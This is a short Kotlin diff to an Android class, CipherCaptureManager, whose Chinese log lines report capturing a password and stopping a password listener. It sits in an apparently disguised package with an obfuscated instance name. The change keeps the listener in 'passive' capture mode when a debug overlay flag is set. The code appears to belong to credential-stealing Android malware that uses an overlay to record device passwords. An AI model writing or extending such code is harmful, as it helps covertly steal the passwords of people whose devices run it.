@@ -1066,8 +1066,13 @@ class CipherCaptureManager(
                 Log.w(TAG, "⚠️ dqtvuisjd 实例为 null")
                 return
             }
-            Log.d(TAG, "✅ [onPasswordCaptureSuccess] 密码捕获成功，停止密码监听")
-            svc.isCipherCaptureEnabled = false
+            Log.d(TAG, "✅ [onPasswordCaptureSuccess] 密码捕获成功")
+            if (!com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
+                svc.isCipherCaptureEnabled = false
+                Log.d(TAG, "✅ 密码监听已停止")
+            } else {
+                Log.d(TAG, "✅ debug 模式保持被动监听")
+            }
             svc.cipherCaptureAttemptCount = 0
             svc.getSharedPreferences("cipher_prefs", 0)
                 .edit()
